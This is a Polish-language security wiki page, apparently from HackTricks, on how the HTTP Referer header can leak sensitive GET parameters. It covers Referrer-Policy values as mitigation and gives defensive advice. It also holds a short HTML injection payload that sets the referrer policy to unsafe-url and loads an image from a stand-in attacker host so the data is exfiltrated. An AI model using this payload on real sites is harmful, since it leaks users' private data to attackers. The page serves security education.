# Interesujący HTTP

{{#include ../banners/hacktricks-training.md}}

## Nagłówki Referrer i polityka

Referrer to nagłówek używany przez przeglądarki do wskazania poprzednio odwiedzonej strony.

### Wyciek poufnych informacji

Jeśli w dowolnym momencie na stronie internetowej w parametrach żądania GET znajdują się poufne informacje, a strona zawiera linki do zewnętrznych źródeł lub atakujący może nakłonić (za pomocą inżynierii społecznej) użytkownika do odwiedzenia adresu URL kontrolowanego przez atakującego, możliwe będzie wyeksfiltrowanie poufnych informacji z ostatniego żądania GET.

### Mitigacja

Możesz skonfigurować przeglądarkę tak, aby stosowała **Referrer-policy**, która może **zapobiec** wysyłaniu poufnych informacji do innych aplikacji webowych:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
### Obejście zabezpieczenia

Możesz obejść tę regułę za pomocą tagu meta HTML (atakujący musi wykorzystać HTML injection):
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Obrona

Nigdy nie umieszczaj żadnych wrażliwych danych w parametrach GET ani ścieżkach URL.

{{#include ../banners/hacktricks-training.md}}
